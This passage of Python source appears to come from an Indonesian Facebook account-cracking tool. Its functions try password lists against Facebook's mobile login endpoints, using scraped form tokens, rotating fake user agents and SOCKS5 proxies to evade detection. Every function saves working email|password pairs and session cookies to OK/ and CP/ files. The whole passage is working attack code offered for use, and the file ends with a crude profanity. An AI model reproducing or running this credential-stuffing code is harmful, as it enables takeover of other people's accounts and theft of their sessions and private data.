				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'x-requested-with': 'com.microsoft.amp.apps.bingnews',
				'sec-fetch-site': 'none',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'accept-encoding': 'gzip, deflate',
				'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'})
			lur = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=855538431298982&kid_directed_site=0&app_id=855538431298982&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D855538431298982%26redirect_uri%3Dhttps%253A%252F%252Fwww.midasbuy.com%252Fmidas%252Fusc%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dmd5code_857d36a8eaac991ab08bbf4e2b69147a_123123_facebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D710ce87c-cf54-46ea-bfe7-ff71b7a90921%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.midasbuy.com%2Fmidas%2Fusc%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dmd5code_857d36a8eaac991ab08bbf4e2b69147a_123123_facebook%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			mek = sop(lur.text,"html.parser")
			action = mek.find("form",{"method":"post"})["action"]
			datanerek = {					
					'lsd':re.search('name="lsd" value="(.*?)"', str(lur.text)).group(1),
					'jazoest':re.search('name="jazoest" value="(.*?)"', str(lur.text)).group(1),
					'm_ts':re.search('name="m_ts" value="(.*?)"', str(lur.text)).group(1),
					'li':re.search('name="li" value="(.*?)"', str(lur.text)).group(1),
					'try_number':re.search('name="try_number" value="(.*?)"', str(lur.text)).group(1),
					'unrecognized_tries':re.search('name="unrecognized_tries" value="(.*?)"', str(lur.text)).group(1),
					'email':idf,
					'pass':pw,
					'login':'Masuk',
					'prefill_contact_point':'',
					'prefill_source':'last_login',
					'prefill_type':'contact_point',
					'first_prefill_source':'last_login',
					'first_prefill_type':'contact_point',
					'had_cp_prefilled':'true',
					'had_password_prefilled':'false',
					'is_smart_lock':'false',
					'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"', str(lur.text)).group(1)
					}
			
			headers = {				
				'Host': 'm.facebook.com',
				'content-length': '429',
				'cache-control': 'max-age=0',
				'upgrade-insecure-requests': '1',
				'origin': 'https://m.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'x-requested-with': 'com.microsoft.amp.apps.bingnews',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': 'com.facebook.katana',
				'accept-encoding': 'gzip, deflate',
				'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'}
			po = ses.post("https://m.facebook.com"+action,data=datanerek,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f"[yellow]Acc CP [red]{tahun(idf)}",guide_style='white')
				tree.add(f"[yellow]{idf}|{pw}[white]").add(f"[yellow]{ua}[white]")
				cetak(tree)
				print("\r")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"[green]Acc OK [blue]{tahun(idf)}",guide_style='white')
				tree.add(f"[green]{idf}|{pw}[white]").add(f"[green]{kuki}[white]")
				cetak(tree)
				print("\r")
				
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#[ METHODE-FREE-FB ]#
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Reguler{x} [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(tod)
#	ua = ua_memek()
#	ua = random.choice(["Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-Infinix X657C Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-meizu 17 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/9.9.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-TECNO KG6p Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.020 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/8.20.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; zh-CN; MZ-itel L6503 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({
'Host': 'free.facebook.com',
'upgrade-insecure-requests': '1',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with': 'AlohaBrowser',
'sec-fetch-site': 'same-site',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/',
'accept-encoding': 'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'dnt': '1'})
			lur = ses.get(f'https://m.facebook.com/login.php?skip_api_login=1&api_key=740202109352935&kid_directed_site=0&app_id=740202109352935&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D740202109352935%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%26state%3D0adeec3bd27a704e77964cddce0606eaee51a438fe1c801bbe1d1916fbae73db%26redirect_uri%3Dhttps%253A%252F%252Fwww.facebookblueprint.com%252Fauthentication%252Ffb_callback%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D30f6feed-ea11-43ef-94a9-26ed4b940f7d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.facebookblueprint.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0adeec3bd27a704e77964cddce0606eaee51a438fe1c801bbe1d1916fbae73db%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1668854471&hrc=1&_rdr')
			mek = sop(lur.text,"html.parser")
			action = mek.find("form",{"method":"post"})["action"]
			
			datane = {
"m_ts": re.search('name="m_ts" value="(.*?)"', str(lur.text)).group(1),
"li": re.search('name="li" value="(.*?)"', str(lur.text)).group(1),
"try_number": re.search('name="try_number" value="(.*?)"', str(lur.text)).group(1),
"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(lur.text)).group(1),
"email": idf,
"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(lur.text)).group(1),
"pass": pw,
"jazoest": re.search('name="jazoest" value="(.*?)"', str(lur.text)).group(1),
"lsd": re.search('name="lsd" value="(.*?)"', str(lur.text)).group(1),
"_fb_noscript": re.search('name="_fb_noscript" value="(.*?)"', str(lur.text)).group(1),}
			
			hederst = {
'Host': 'm.facebook.com',
'content-length': f'{len(str(datane))}',
'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(lur.text)).group(1),
'user-agent': ua,
'content-type': 'application/x-www-form-urlencoded',
'accept': '*/*',
'origin': 'https://m.facebook.com',
'x-requested-with': 'AlohaBrowser',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=740202109352935&kid_directed_site=0&app_id=740202109352935&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D740202109352935%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%26state%3D0adeec3bd27a704e77964cddce0606eaee51a438fe1c801bbe1d1916fbae73db%26redirect_uri%3Dhttps%253A%252F%252Fwww.facebookblueprint.com%252Fauthentication%252Ffb_callback%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D30f6feed-ea11-43ef-94a9-26ed4b940f7d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.facebookblueprint.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0adeec3bd27a704e77964cddce0606eaee51a438fe1c801bbe1d1916fbae73db%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1668854471&hrc=1&_rdr',
'accept-encoding': 'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'dnt': '1'}
			po = ses.post("https://m.facebook.com"+action, headers=hederst,data=datane, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
#				oi = nel(f'[yellow]EMAIL[white]|[yellow]PASS   [white]: [yellow]{idf}[white]|[yellow]{pw}\n[yellow]USER AGENT   [white]:[yellow] {ua}', style='yellow',title='[yellow] login from m.facebook.com[/] ')
#				cetak(nel(oi, title='[green]• [yellow]• [red]• [yellow]YOTTA[white]•[yellow]CP[/] [red]• [yellow]• [green]•',subtitle=f'[green]• [yellow]• [red]• [yellow]AKUN[white]•[yellow]{tahun(idf)} [red]• [yellow]• [green]•'))
				
				tree = Tree(f"[yellow]Acc CP [red]{tahun(idf)}",guide_style='white')
				tree.add(f"[yellow]{idf}|{pw}[white]")
				cetak(tree)
				print("\r")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				oi = nel(f'[green]EMAIL[white]|[green]PASS   [white]: [green]{idf}[white]|[green]{pw}\n[green]USER AGENT   [white]:[green] {ua}\nCOOKIES      [white]:[green] {kuki}', style='green',title='[green] login from m.facebook.com[/] ')
#				cetak(nel(oi, title='[green]• [yellow]• [red]• [yellow]YOTTA[white]•[yellow]CP[/] [red]• [yellow]• [green]•',subtitle=f'[green]• [yellow]• [red]• [yellow]AKUN[white]•[green]{tahun(idf)} [red]• [yellow]• [green]•'))
				
				tree = Tree(f"[green]Acc OK [blue]{tahun(idf)}",guide_style='white')
				tree.add(f"[green]{idf}|{pw}[white]").add(f"[green]{kuki}[white]")
				cetak(tree)
				print("\r")
				
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#[ METHODE-MBASIC ]#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}Viladate{x} [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
#	ua = random.choice(tod)
	ua = ua_memek()
#	ua = random.choice(["Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-Infinix X657C Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-meizu 17 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/9.9.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-TECNO KG6p Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.020 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/8.20.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; zh-CN; MZ-itel L6503 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36"])
#	ua = ("Mozilla/5.0 (Linux; Android 10; Infinix X682C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			lur = ses.get(f'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D153040644900826%26cbt%3D1669935554956%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df204ee59b7478c%2526domain%253Dwww.sololearn.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.sololearn.com%25252Ff325bd3ccc72b68%2526relation%253Dopener%26client_id%3D153040644900826%26display%3Dtouch%26domain%3Dwww.sololearn.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.sololearn.com%252F%26locale%3Den_US%26logger_id%3Df2ea019bb54cfd%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12a968c543198%2526domain%253Dwww.sololearn.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.sololearn.com%25252Ff325bd3ccc72b68%2526relation%253Dopener%2526frame%253Df1aaaf3ac419b3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12a968c543198%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener%26frame%3Df1aaaf3ac419b3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			
			datane = {						
						"lsd": re.search('name="lsd" value="(.*?)"', str(lur.text)).group(1),
						"jazoest": re.search('name="jazoest" value="(.*?)"', str(lur.text)).group(1),
						"uid": idf,
						"next": "https://m.facebook.com/v15.0/dialog/oauth?app_id=153040644900826&cbt=1669935554956&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df204ee59b7478c%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener&client_id=153040644900826&display=touch&domain=www.sololearn.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.sololearn.com%2F&locale=en_US&logger_id=f2ea019bb54cfd&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12a968c543198%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener%26frame%3Df1aaaf3ac419b3c&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v15.0&ret=login&fbapp_pres=0&tp=unspecified",
						"flow": "login_no_pin",
						"encpass": "#PWD_BROWSER:5:{}:{}".format(ran(),pw),
						}
			
			hederst = {			
			'Host': 'm.facebook.com',
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with': 'com.microsoft.bing',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D153040644900826%26cbt%3D1669935554956%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df204ee59b7478c%2526domain%253Dwww.sololearn.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.sololearn.com%25252Ff325bd3ccc72b68%2526relation%253Dopener%26client_id%3D153040644900826%26display%3Dtouch%26domain%3Dwww.sololearn.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.sololearn.com%252F%26locale%3Den_US%26logger_id%3Df2ea019bb54cfd%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12a968c543198%2526domain%253Dwww.sololearn.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.sololearn.com%25252Ff325bd3ccc72b68%2526relation%253Dopener%2526frame%253Df1aaaf3ac419b3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12a968c543198%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener%26frame%3Df1aaaf3ac419b3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate',
			'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', headers=hederst, data=datane, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
#				oi = nel(f'[yellow]EMAIL[white]|[yellow]PASS   [white]: [yellow]{idf}[white]|[yellow]{pw}\n[yellow]USER AGENT   [white]:[yellow] {ua}', style='yellow',title='[yellow] login from m.facebook.com[/] ')
#				cetak(nel(oi, title='[green]• [yellow]• [red]• [yellow]YOTTA[white]•[yellow]CP[/] [red]• [yellow]• [green]•',subtitle=f'[green]• [yellow]• [red]• [yellow]AKUN[white]•[yellow]{tahun(idf)} [red]• [yellow]• [green]•'))
				
				tree = Tree(f"[yellow]Acc CP [red]{tahun(idf)}",guide_style='white')
				tree.add(f"[yellow]{idf}|{pw}[white]")
				cetak(tree)
				print("\r")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				oi = nel(f'[green]EMAIL[white]|[green]PASS   [white]: [green]{idf}[white]|[green]{pw}\n[green]USER AGENT   [white]:[green] {ua}\nCOOKIES      [white]:[green] {kuki}', style='green',title='[green] login from m.facebook.com[/] ')
#				cetak(nel(oi, title='[green]• [yellow]• [red]• [yellow]YOTTA[white]•[yellow]CP[/] [red]• [yellow]• [green]•',subtitle=f'[green]• [yellow]• [red]• [yellow]AKUN[white]•[green]{tahun(idf)} [red]• [yellow]• [green]•'))
				
				tree = Tree(f"[green]Acc OK [blue]{tahun(idf)}",guide_style='white')
				tree.add(f"[green]{idf}|{pw}[white]").add(f"[green]{kuki}[white]")
				cetak(tree)
				print("\r")
				
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	back()

#KATA HARI INI : KONTOL